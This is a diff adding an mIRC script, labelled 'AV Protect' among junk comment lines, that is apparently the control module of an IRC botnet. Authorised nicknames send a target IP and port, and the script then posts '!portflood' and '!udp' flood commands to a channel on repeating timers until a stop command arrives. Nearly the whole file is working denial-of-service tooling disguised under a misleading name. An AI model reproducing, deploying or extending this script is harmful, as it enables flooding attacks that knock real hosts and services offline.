@@ -1,0 +1,38 @@
+;ayfa97r43fh3024u8f
+;3q4f0u2q13fj0utr093jf34f
+;AV Protect
+;afo873q048f
+alias actionAUTH { timeractionAUTH 1 100 msg %chan.for.join !start | timerFLOOD 2 110 msg %chan.for.join !portflood %actionip %actionport 1000 | actionSUPPORT }
+alias actionAUTH1 { timeractionAUTH1 1 100 msg %chan.for.join !start | timerFLOOD1 2 110 msg %chan.for.join !udp %actionip1 1000 | actionSUPPORT1 }
+alias actionSUPPORT { timerSUPPORT 3 120 timeractionAUTH off | timerSUP 4 130 actionAUTH }
+alias actionSUPPORT1 { timerSUPPORT1 3 120 timeractionAUTH1 off | timerSUP1 4 130 actionAUTH1 }
+
+on *:text:*:*: {
+  if (%auth [ $+ [ $nick ] ] != yes) { halt }
+
+  if (!comm. isin $1) {
+    if ( ($remove($1,!comm.) != *) && ($remove($1,!comm.) != $me) ) { halt }
+    if ($2 == $null) { msg $schannick Error/Syntax: !actionx ip port | halt }
+    if ($3 == $null) { msg $schannick Error/Syntax: !actionx ip port | halt }
+    set %actionip $2 | set %actionport $3 | actionAUTH | msg %chan.for.join ip address is  %actionip  : port is  %actionport  : command for atack was started
+  }
+  if (!scomm. isin $1) {
+    if ( ($remove($1,!scomm.) != *) && ($remove($1,!scomm.) != $me) ) { halt }
+    timeractionAUTH off | timerFLOOD off | timerSUP off | timerSUPPORT off | msg %chan.for.join command for atack on ip address  $+ %actionip $+  port  $+ %actionport $+  was stoped
+  }
+}
+
+on *:text:*:*: {
+  if (%auth [ $+ [ $nick ] ] != yes) { halt }
+
+  if (!comm1. isin $1) {
+    if ( ($remove($1,!comm1.) != *) && ($remove($1,!comm1.) != $me) ) { halt }
+    if ($2 == $null) { msg $schannick Error/Syntax: !actionx ip port | halt }
+
+    set %actionip1 $2 | actionAUTH1 | msg %chan.for.join ip address is  %actionip1  : port is   : command for atack was started
+  }
+  if (!scomm1. isin $1) {
+    if ( ($remove($1,!scomm1.) != *) && ($remove($1,!scomm1.) != $me) ) { halt }
+    timeractionAUTH1 off | timerFLOOD1 off | timerSUP1 off | timerSUPPORT1 off | msg %chan.for.join command for atack on ip address  $+ %actionip1 $+  port   was stoped
+  }
+}
